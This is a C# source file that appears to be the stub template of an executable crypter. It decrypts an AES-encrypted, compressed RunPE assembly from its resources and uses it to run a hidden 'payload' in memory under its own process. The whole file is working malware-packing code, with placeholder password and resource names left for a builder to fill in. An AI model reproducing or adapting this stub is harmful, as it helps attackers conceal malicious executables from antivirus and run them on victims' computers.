using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Resources;
using System.Reflection;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Security.Cryptography;
using System.IO.Compression;

namespace ExeEncrypter.Resources
{
    class Program
    {
        public static void Main()
        {
            
            try
            {
                Assembly DLL = AppDomain.CurrentDomain.Load(DecompressByte(AES_Decrypt(GetResource("RunPE"), "#password")));
                Type myType = DLL.GetType("RunPE.RunPE");
                MethodInfo method = myType.GetMethod("Run");

                method.Invoke(null, new object[] { Application.ExecutablePath, DecompressByte(AES_Decrypt(GetResource("payload"), "#password")), false });
                //RunPE.Run(Application.ExecutablePath, AES_Decrypt(GetResource("payload"), "#password"), false);
                
            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }
        }

        private static byte[] GetResource(string file)
        {
            ResourceManager ResManager = new ResourceManager("#filename", Assembly.GetExecutingAssembly());
            return (byte[])ResManager.GetObject(file);
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, string password)
        {
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }
        public static byte[] DecompressByte(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }
    }
}
